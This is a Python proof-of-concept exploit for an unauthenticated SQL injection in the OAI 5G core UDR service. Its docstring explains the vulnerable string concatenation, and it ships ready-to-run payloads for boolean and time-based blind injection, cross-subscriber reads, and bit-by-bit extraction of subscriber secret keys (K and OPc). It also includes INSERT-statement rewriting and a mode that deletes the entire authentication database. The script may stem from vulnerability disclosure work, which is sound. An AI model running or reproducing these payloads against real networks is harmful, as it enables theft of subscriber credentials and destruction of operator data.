#!/usr/bin/env python3
"""
OAI CN5G UDR (oai-cn5g-udr) -- unauthenticated SQL injection in Nudr_DR
AuthenticationSubscription / SM-data ueId path parameter.

The UDR builds every MySQL statement by raw string concatenation of a REST
path segment (src/udr_app/database/mysql_db.cpp, e.g.

    std::string query = "SELECT * FROM AuthenticationSubscription"
                        " WHERE ueid='" + ue_id + "'";

with zero occurrences of mysql_real_escape_string() in 3062 lines).  The only
validation on the way in is udr_app::get_supi() (src/udr_app/udr_app.cpp:787),
which merely requires that the text before the FIRST '-' is the literal
"imsi"; everything after it is forwarded verbatim.

The OAI SBI plane carries no OAuth2/NF-consumer authentication in the shipped
docker-compose basic-nrf deployment, so any host that can reach the UDR on
tcp/8080 can read, modify or destroy the whole subscriber authentication
database (encPermanentKey = K, encOpcKey = OPc, sequenceNumber = SQN).

Usage:
    python3 udr_sqli_poc.py --target 172.30.0.10 --port 8080 [--mode all]
    python3 udr_sqli_poc.py --target <ip> --mode exfil --victim 208950000000031
    python3 udr_sqli_poc.py --target <ip> --mode wipe     # DESTRUCTIVE

Modes:
    baseline  legitimate read of a provisioned UE (control)
    boolean   TRUE-predicate vs FALSE-predicate on the same UE (injection proof)
    timebl    time-based blind (SLEEP) -- works when no data is reflected
    xsub      ask for a NON-EXISTENT UE and receive ANOTHER UE's K/OPc
    exfil     bit-by-bit blind extraction of encPermanentKey + encOpcKey
    insert    rewrite the SdmSubscriptions INSERT via a quote in a body
              field (POST); the injected assignment sets the server-internal
              subsId, which the API never accepts from a client
    wipe      DESTRUCTIVE: DELETE every row of AuthenticationSubscription

Requires only Python 3 + the `h2` package (HTTP/2 cleartext, prior knowledge).
"""

import argparse
import json
import socket
import ssl  # noqa: F401  (kept out; OAI SBI is h2c)
import sys
import time

try:
    import h2.config
    import h2.connection
    import h2.events
except ImportError:
    sys.exit("ERROR: the 'h2' package is required (pip3 install h2)")

BASE = "/nudr-dr/v1/subscription-data"
AUTH_TAIL = "/authentication-data/authentication-subscription"
SM_TAIL = "/sm-data"
SDM_TAIL = "/context-data/sdm-subscriptions"


# --------------------------------------------------------------------------
# minimal h2c (prior-knowledge) client -- one request per TCP connection
# --------------------------------------------------------------------------
def h2c_get(host, port, path, method="GET", timeout=25, body=None):
    """Return (status, body_bytes, elapsed_seconds) for one h2c request."""
    if isinstance(body, str):
        body = body.encode()
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
    conn = h2.connection.H2Connection(config=cfg)
    conn.initiate_connection()
    s.sendall(conn.data_to_send())

    headers = [
        (":method", method),
        (":scheme", "http"),
        (":path", path),
        (":authority", "%s:%d" % (host, port)),
        ("user-agent", "udr-sqli-poc"),
        ("accept", "application/json"),
    ]
    if body is not None:
        headers.append(("content-type", "application/json"))
        headers.append(("content-length", str(len(body))))
    conn.send_headers(1, headers, end_stream=(body is None))
    if body is not None:
        conn.send_data(1, body, end_stream=True)
    s.sendall(conn.data_to_send())

    status, body, done = None, b"", False
    t0 = time.time()
    while not done and (time.time() - t0) < timeout:
        try:
            data = s.recv(65535)
        except socket.timeout:
            break
        if not data:
            break
        for ev in conn.receive_data(data):
            if isinstance(ev, h2.events.ResponseReceived):
                for k, v in ev.headers:
                    if k == ":status":
                        status = v
            elif isinstance(ev, h2.events.DataReceived):
                body += ev.data
                conn.acknowledge_received_data(
                    ev.flow_controlled_length, ev.stream_id
                )
            elif isinstance(ev, h2.events.StreamEnded):
                done = True
            elif isinstance(ev, h2.events.StreamReset):
                done = True
            elif isinstance(ev, h2.events.WindowUpdated):
                pass
        s.sendall(conn.data_to_send())
    elapsed = time.time() - t0
    try:
        conn.close_connection()
        s.sendall(conn.data_to_send())
    except Exception:
        pass
    s.close()
    return status, body, elapsed


def auth_path(ueid_segment):
    return BASE + "/" + ueid_segment + AUTH_TAIL


def sdm_path(ueid_segment):
    return BASE + "/" + ueid_segment + SDM_TAIL


def show(label, status, body, elapsed, want_json=True):
    txt = ""
    if body and want_json:
        try:
            txt = json.dumps(json.loads(body), sort_keys=True)
        except Exception:
            txt = body.decode("utf-8", "replace")
    print(
        "  [%-9s] HTTP %-4s %7.3fs  %s"
        % (label, status if status else "NONE", elapsed, txt[:300])
    )
    return txt


def key_of(body):
    try:
        j = json.loads(body)
        return j.get("encPermanentKey"), j.get("encOpcKey"), j.get("supi")
    except Exception:
        return None, None, None


# --------------------------------------------------------------------------
def run_baseline(t, p, victim):
    print("[*] BASELINE -- legitimate read of a provisioned UE (control)")
    st, bd, el = h2c_get(t, p, auth_path("imsi-" + victim))
    show("baseline", st, bd, el)
    return st, bd


def run_boolean(t, p, victim):
    print("\n[*] BOOLEAN BLIND -- same UE, TRUE vs FALSE injected predicate")
    print("    payload sits entirely inside the ueId path segment; no URL")
    print("    decoding and no whitespace are required by the server.")
    true_pl = "imsi-%s'AND'1'='1" % victim
    false_pl = "imsi-%s'AND'1'='2" % victim
    st_t, bd_t, el_t = h2c_get(t, p, auth_path(true_pl))
    a = show("TRUE", st_t, bd_t, el_t)
    st_f, bd_f, el_f = h2c_get(t, p, auth_path(false_pl))
    b = show("FALSE", st_f, bd_f, el_f)
    verdict = (st_t == "200") and (st_f != "200")
    print(
        "    => injected predicate controls the result set: %s"
        % ("YES (INJECTION CONFIRMED)" if verdict else "no")
    )
    return verdict


def run_timebl(t, p, victim, delay=3):
    print("\n[*] TIME-BASED BLIND -- SLEEP(%d) inside the WHERE clause" % delay)
    st0, bd0, el0 = h2c_get(t, p, auth_path("imsi-" + victim))
    show("nodleay", st0, bd0, el0)
    # AND-form on purpose: MySQL constant-folds `'1'='1'` and short-circuits an
    # `X OR TRUE`, so the OR-form never evaluates SLEEP().  With AND the
    # predicate is only reached for the single row whose ueid matches, giving
    # exactly one delay of `delay` seconds.
    pl = "imsi-%s'AND(SLEEP(%d))AND'1'='1" % (victim, delay)
    st1, bd1, el1 = h2c_get(t, p, auth_path(pl))
    show("sleep%d" % delay, st1, bd1, el1)
    ok = el1 >= delay and el0 < delay / 2.0
    print(
        "    => server-side delay %.3fs vs baseline %.3fs: %s"
        % (el1, el0, "CONFIRMED" if ok else "inconclusive")
    )
    return ok


def run_xsub(t, p, victim, ghost="imsi-999999999999999"):
    print("\n[*] CROSS-SUBSCRIBER READ -- request a UE that DOES NOT EXIST")
    st, bd, el = h2c_get(t, p, auth_path(ghost))
    show("ghost", st, bd, el)
    if st == "200":
        print("    (unexpected: the ghost UE exists)")
    # ask for the ghost UE, but make the predicate match the victim instead
    pl = "%s'OR(ueid='%s')OR'1'='2" % (ghost, victim)
    st2, bd2, el2 = h2c_get(t, p, auth_path(pl))
    show("inject", st2, bd2, el2)
    k, opc, supi = key_of(bd2)
    ok = st2 == "200" and k is not None
    if ok:
        print(
            "    => NON-EXISTENT ueId returned victim %s:"
            "\n       encPermanentKey (K)   = %s"
            "\n       encOpcKey        (OPc) = %s"
            "\n       supi                  = %s" % (victim, k, opc, supi)
        )
    return ok


HEXCH = "0123456789ABCDEFabcdef"


def run_exfil(t, p, victim, column="encPermanentKey", maxchars=32):
    print(
        "\n[*] BLIND BIT-BY-BIT EXFIL of %s for ueid=%s"
        "\n    (one request per candidate character; no data is reflected"
        "\n     other than 200-vs-404)" % (column, victim)
    )
    out = ""
    for pos in range(1, maxchars + 1):
        found = None
        for ch in HEXCH:
            pl = "imsi-0'OR((ueid='%s')AND(SUBSTRING(%s,%d,1)='%s'))OR'1'='2" % (
                victim,
                column,
                pos,
                ch,
            )
            st, bd, el = h2c_get(t, p, auth_path(pl))
            if st == "200":
                found = ch
                break
        if found is None:
            break
        out += found
        sys.stdout.write(".")
        sys.stdout.flush()
    print("\n    => recovered %s = %s (%d chars, %d requests)"
          % (column, out, len(out), len(out) * len(HEXCH)))
    return out


def run_insert(t, p, ghost="999999999999999", subsid=1337):
    attack_ghost = str(int(ghost) - 1)
    logecho_ghost = str(int(ghost) - 2)
    print(
        "\n[*] INSERT INJECTION -- rewrite the SdmSubscriptions INSERT via a"
        "\n    single quote in the JSON body field dnn (POST). The ueId"
        "\n    segment stays clean, so the server's gap-scan SELECT stays"
        "\n    valid; only the INSERT statement is rewritten."
    )
    clean = {
        "nfInstanceId": "94e1a2c4-8b7d-4e2f-9a1b-5gcsqlinsertpoc",
        "callbackReference": "http://172.30.0.1:9/sdm-notify",
        "monitoredResourceUris": ["urn:nudr-dr:subscription-data"],
        "dnn": "oai",
    }
    # 1) control -- clean body on a fresh ueId: the row is stored and the
    #    server assigns the AUTO_INCREMENT primary key subsId itself.
    st, bd, el = h2c_get(
        t, p, sdm_path("imsi-" + ghost), method="POST",
        body=json.dumps(clean),
    )
    show("control", st, bd, el)
    # 2) attack -- same body on ANOTHER fresh ueId; dnn closes its SQL
    #    string and injects assignments for the server-internal subsId
    #    and a marker column. The template's own closing quote terminates
    #    the marker string, so the rewritten INSERT is valid MySQL.
    atk = dict(clean)
    atk["dnn"] = "oai',subsId=%d,subscriptionId='sql-injected-row" % subsid
    st2, bd2, el2 = h2c_get(
        t, p, sdm_path("imsi-" + attack_ghost), method="POST",
        body=json.dumps(atk),
    )
    show("insert", st2, bd2, el2)
    # 3) read the row back through the API itself
    st3, bd3, el3 = h2c_get(t, p, sdm_path("imsi-" + attack_ghost))
    show("readback", st3, bd3, el3)
    # 4) log-echo probe -- the same injection with a trailing comma is
    #    invalid MySQL, so the UDR logs the fully interpolated statement
    #    on its failure path (the only place this sink logs its SQL).
    echo = dict(clean)
    echo["dnn"] = "oai',subsId=%d," % subsid
    st4, bd4, el4 = h2c_get(
        t, p, sdm_path("imsi-" + logecho_ghost), method="POST",
        body=json.dumps(echo),
    )
    show("logecho", st4, bd4, el4)
    ok = (
        str(st).startswith("2")
        and str(st2).startswith("2")
        and str(st3).startswith("2")
    )
    if ok:
        print(
            "    => rewritten INSERT accepted: row ueid=%s carries the"
            "\n       attacker-chosen subsId=%d and marker"
            "\n       subscriptionId='sql-injected-row'; the API read-back"
            "\n       serves the row, and the failed log-echo variant is"
            "\n       logged verbatim by the UDR"
            % (attack_ghost, subsid)
        )
    return ok


def run_wipe(t, p):
    print("\n[*] DESTRUCTIVE -- DELETE every row of AuthenticationSubscription")
    print("    payload: imsi-0'OR'1'='1   (no WHERE clause survives)")
    pl = "imsi-0'OR'1'='1"
    st, bd, el = h2c_get(t, p, auth_path(pl), method="DELETE")
    show("delete", st, bd, el)
    st2, bd2, el2 = h2c_get(t, p, auth_path("imsi-208950000000031"))
    show("verify", st2, bd2, el2)
    print(
        "    => post-wipe read of a previously valid UE returns %s"
        % st2
    )
    return st in ("200", "204")


def main():
    ap = argparse.ArgumentParser(description="OAI CN5G UDR SQLi PoC")
    ap.add_argument("--target", required=True, help="UDR IP or hostname")
    ap.add_argument("--port", type=int, default=8080, help="UDR SBI port")
    ap.add_argument(
        "--mode",
        default="all",
        choices=[
            "all",
            "baseline",
            "boolean",
            "timebl",
            "xsub",
            "exfil",
            "insert",
            "wipe",
        ],
    )
    ap.add_argument("--victim", default="208950000000031")
    ap.add_argument("--column", default="encPermanentKey")
    ap.add_argument("--delay", type=int, default=3)
    ap.add_argument("--ghost", default="999999999999999")
    ap.add_argument("--subsid", type=int, default=1337)
    a = ap.parse_args()

    print("OAI CN5G UDR unauthenticated SQL injection PoC")
    print("  target = %s:%d   mode = %s" % (a.target, a.port, a.mode))
    print("  endpoint = GET/DELETE %s/{ueId}%s" % (BASE, AUTH_TAIL))
    print("-" * 72)

    res = {}
    run_baseline(a.target, a.port, a.victim)
    if a.mode in ("all", "boolean"):
        res["boolean"] = run_boolean(a.target, a.port, a.victim)
    if a.mode in ("all", "timebl"):
        res["timebl"] = run_timebl(a.target, a.port, a.victim, a.delay)
    if a.mode in ("all", "xsub"):
        res["xsub"] = run_xsub(a.target, a.port, a.victim)
    if a.mode in ("all", "exfil"):
        k = run_exfil(a.target, a.port, a.victim, a.column)
        opc = run_exfil(a.target, a.port, a.victim, "encOpcKey")
        res["exfil"] = bool(k) and bool(opc)
        res["K"] = k
        res["OPc"] = opc
    if a.mode in ("all", "insert"):
        res["insert"] = run_insert(a.target, a.port, a.ghost, a.subsid)
    if a.mode == "wipe":
        res["wipe"] = run_wipe(a.target, a.port)

    print("-" * 72)
    print("SUMMARY: %s" % json.dumps(res, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
